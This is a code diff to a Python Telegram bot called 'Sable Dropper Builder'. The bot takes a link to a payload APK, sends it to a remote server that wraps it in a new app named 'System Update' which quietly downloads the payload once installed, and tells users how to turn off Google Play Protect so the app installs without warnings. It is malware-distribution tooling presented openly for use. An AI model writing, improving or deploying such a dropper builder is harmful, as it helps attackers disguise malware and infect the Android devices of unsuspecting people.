@@ -11,14 +11,16 @@ RENDER_URL = os.environ.get("RENDER_URL")
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
-        [InlineKeyboardButton("🚀 Build Dropper APK", callback_data="build")],
+        [InlineKeyboardButton("🚀 Build Standalone Dropper", callback_data="build")],
         [InlineKeyboardButton("🛡️ Bypass Play Protect", callback_data="bypass")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await update.message.reply_text(
         "🔥 **Welcome to Sable Dropper Builder** 🔥\n\n"
-        "Mujhe payload ka direct download link bhej, main ek naya APK bana dunga jo background me chupke se payload install karega.",
+        "Main ek advanced Standalone Dropper builder hoon. Mujhe payload ka link bhej, "
+        "main ek naya APK bana kar dunga jo install hote hi payload download karega.\n\n"
+        "Neeche diye gaye buttons ka use kar:",
         reply_markup=reply_markup,
         parse_mode='Markdown'
     )
@@ -28,16 +30,16 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     
     if query.data == "build":
-        await query.edit_message_text("📥 **Payload APK ka direct link bhej...**", parse_mode='Markdown')
+        await query.edit_message_text("📥 **Payload APK ka direct link bhej...**\n\nMain usko chhupa kar ek naya APK bana dunga.", parse_mode='Markdown')
         context.user_data['waiting_for_url'] = True
     elif query.data == "bypass":
         await query.edit_message_text("🛡️ **Play Protect Bypass Guide:**\n\n"
                                       "1. Play Store > Profile > Play Protect > Settings (Gear).\n"
                                       "2. 'Scan apps with Play Protect' ko OFF kar do.\n"
-                                      "3. APK install karo.\n"
+                                      "3. APK install karo (Bina kisi warning ke install hoga).\n"
                                       "4. Install ke baad Play Protect wapas ON kar lena.", parse_mode='Markdown')
 
-async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.user_data.get('waiting_for_url'):
         return
 
@@ -54,7 +56,7 @@ async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         response = requests.post(server_endpoint, json={
             "payload_url": payload_url,
-            "app_name": "System Update" # Yahan naam badal sakta hai
+            "app_name": "System Update" 
         }, timeout=300)
 
         if response.status_code == 200:
@@ -69,7 +71,7 @@ async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     "1. Play Store > Profile > Play Protect > Settings (Gear).\n"
                     "2. 'Scan apps with Play Protect' ko OFF kar do.\n"
                     "3. Ye APK install karo.\n"
-                    "4. Install hote hi ye background me tera payload install kar dega."
+                    "4. Install hote hi ye background me tera payload download karega."
                 ),
                 parse_mode='Markdown'
             )
@@ -86,11 +88,20 @@ async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         await progress_msg.edit_text(f"❌ **Error aaya:**\n`{str(e)}`", parse_mode='Markdown')
 
+# APK File bhejne pe kya kare?
+async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "⚠️ **Baby, main direct APK file accept nahi karta.**\n\n"
+        "Main ek **Standalone Dropper** banata hoon. Iske liye mujhe us APK ka **Direct Download Link** chahiye (jaise Google Drive ka nahi, koi direct link ho).\n\n"
+        "Kripya /start pe jaa kar 'Build Standalone Dropper' pe click kar aur link bhej."
+    )
+
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(button_handler))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_url))
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_apk)) # File aane par message
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)) # Link aane par kaam
     print("Standalone Bot is running...")
     app.run_polling()
 
